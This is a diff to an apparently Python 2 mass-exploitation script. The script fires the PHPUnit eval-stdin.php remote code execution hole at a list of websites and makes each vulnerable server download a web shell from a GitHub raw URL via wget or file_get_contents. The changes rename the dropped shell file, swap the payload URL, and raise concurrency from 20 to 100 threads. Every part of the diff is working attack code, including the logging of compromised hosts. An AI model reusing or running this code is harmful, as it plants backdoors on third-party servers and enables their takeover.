@@ -22,7 +22,7 @@ def rce(url):
     for paths in no_list:
         try:
             cekos = '<?php echo php_uname("a"); ?>'
-            upshell = '<?php system("wget https://raw.githubusercontent.com/cafcbr40ck/PasukanBeraniMati/main/idb.php -O unit.php"); ?>'
+            upshell = '<?php system("wget https://raw.githubusercontent.com/cafcbr40ck/PasukanBeraniMati/main/kontolodon.php -O kontolodon.php"); ?>'
             url = url.strip()
             cek = r.get(url+paths+'eval-stdin.php', data=cekos)
             if 'Linux' in cek.text:
@@ -31,8 +31,8 @@ def rce(url):
                 r.get(url+paths+'eval-stdin.php', data=upshell)
                 cekshell = r.get(url+paths+'unit.php?ng0r0ng')
                 if 'CaFc_Br40ck' in cekshell.text:
-                    print "[Shell Uploaded] " + url+paths+'unit.php?ng0r0ng'
-                    open('new_shell_phpunit.txt', 'a').write(cek.text+'\n'+url+paths+'unit.php?ng0r0ng'+'\n')
+                    print "[Shell Uploaded] " + url+paths+'kontolodon.php'
+                    open('new_shell_phpunit.txt', 'a').write(cek.text+'\n'+url+paths+'kontolodon.php'+'\n')
                 else:
                     print "[Shell not Uploaded]   : " + cekshell
             else:
@@ -46,17 +46,17 @@ def rce2(url):
     for paths in no_list:
         try:
             cekos = '<?php echo php_uname("a"); ?>'
-            upshell = '<?php fwrite(fopen("raimu.php","w+"),file_get_contents("https://raw.githubusercontent.com/cafcbr40ck/PasukanBeraniMati/main/idb.php")); ?>'
+            upshell = '<?php fwrite(fopen("asuw.php","w+"),file_get_contents("https://raw.githubusercontent.com/cafcbr40ck/PasukanBeraniMati/main/kontolodon.php")); ?>'
             url = url.strip()
             cek = r.get(url+paths+'eval-stdin.php', data=cekos)
             if 'Linux' in cek.text:
                 print "[os] " + cek.text
                 open('new_phpunitvuln.txt', 'a').write(cek.text+'\n'+url+paths+'eval-stdin.php'+'\n')
                 r.get(url+paths+'eval-stdin.php', data=upshell)
-                cekshell = r.get(url+paths+'raimu.php?ng0r0ng')
+                cekshell = r.get(url+paths+'asuw.php')
                 if 'CaFc_Br40ck' in cekshell.text:
-                    print "[Shell Uploaded] " + url+paths+'raimu.php?ng0r0ng'
-                    open('new_shell_phpunit.txt', 'a').write(cek.text+'\n'+url+paths+'raimu.php?ng0r0ng'+'\n')
+                    print "[Shell Uploaded] " + url+paths+'asuw.php'
+                    open('new_shell_phpunit.txt', 'a').write(cek.text+'\n'+url+paths+'asuw.php'+'\n')
                 else:
                     print "[Shell not Uploaded]   : " + cekshell
             else:
@@ -351,7 +351,7 @@ def robot(url):
 def main():
     list = open(sys.argv[1], 'r').readlines()
     try:
-        ThreadPool = Pool(20)
+        ThreadPool = Pool(100)
         ThreadPool.map(robot, list)
     except:
         pass
